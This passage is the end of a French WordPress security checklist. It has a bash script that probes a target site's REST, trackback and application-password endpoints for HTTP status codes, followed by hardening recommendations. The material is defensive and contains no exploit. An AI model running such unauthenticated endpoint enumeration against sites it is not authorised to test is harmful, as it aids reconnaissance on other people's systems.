echo -e "\n[5] TRACKBACK" | tee -a "$REPORT"
echo -n "Endpoint HTTP: " | tee -a "$REPORT"
curl -sI "$TARGET/wp-trackback.php" -o /dev/null -w "%{http_code}\n" | tee -a "$REPORT"

echo -e "\n[6] COMMENTS" | tee -a "$REPORT"
echo -n "Comments API: " | tee -a "$REPORT"
curl -s "$TARGET/wp-json/wp/v2/comments" -o /dev/null -w "%{http_code}\n" | tee -a "$REPORT"

echo -e "\n[7] APPLICATION PASSWORDS" | tee -a "$REPORT"
echo -n "Endpoint: " | tee -a "$REPORT"
curl -s "$TARGET/wp-json/wp/v2/users/me/application-passwords" \
  -o /dev/null -w "%{http_code}\n" | tee -a "$REPORT"

echo -e "\n[8] SITE HEALTH" | tee -a "$REPORT"
echo -n "Endpoint: " | tee -a "$REPORT"
curl -s "$TARGET/wp-json/wp-site-health/v1" \
  -o /dev/null -w "%{http_code}\n" | tee -a "$REPORT"

echo -e "\n[9] BLOCK DIRECTORY" | tee -a "$REPORT"
echo -n "Block search: " | tee -a "$REPORT"
curl -s "$TARGET/wp-json/wp/v2/block-directory/search?term=test" \
  -o /dev/null -w "%{http_code}\n" | tee -a "$REPORT"

echo -e "\n[10] LINK MANAGER" | tee -a "$REPORT"
echo -n "Links API: " | tee -a "$REPORT"
curl -s "$TARGET/wp-json/wp/v2/links" \
  -o /dev/null -w "%{http_code}\n" | tee -a "$REPORT"

echo -e "\n========================================" | tee -a "$REPORT"
echo "Audit complete: $REPORT" | tee -a "$REPORT"
```

---

## Recommandations

| Action recommandée | Détail |
|---|---|
| **Désactiver XML-RPC** | Bloquer ou supprimer `xmlrpc.php` si non utilisé (via `.htaccess` ou WAF) |
| **Désactiver WP-Cron** | Définir `define('DISABLE_WP_CRON', true);` dans `wp-config.php` + cron système |
| **Limiter Heartbeat** | Utiliser le filtre `heartbeat_settings` pour réduire la fréquence ou désactiver |
| **Désactiver Trackback/Pingback** | Décocher « Allow link notifications » dans Réglages > Discussion |
| **Fermer les commentaires** | Désactiver les commentaires sur les articles anciens, activer la modération |
| **Désactiver Application Passwords** | Ajouter `add_filter('wp_is_application_passwords_available', '__return_false');` |
| **Désactiver Block Directory** | Ajouter `add_filter('block_editor_settings', fn($s) => [...$s, 'enableBlockDirectory' => false]);` |
| **Désactiver Link Manager** | Ajouter `add_filter('pre_option_link_manager_enabled', '__return_false');` |
| **Désactiver oEmbed** | Bloquer `wp-json/oembed/1.0/embed` via WAF si non utilisé |

---

*Checklist créée le 16 juillet 2026, Audit à distance, sans authentification.*
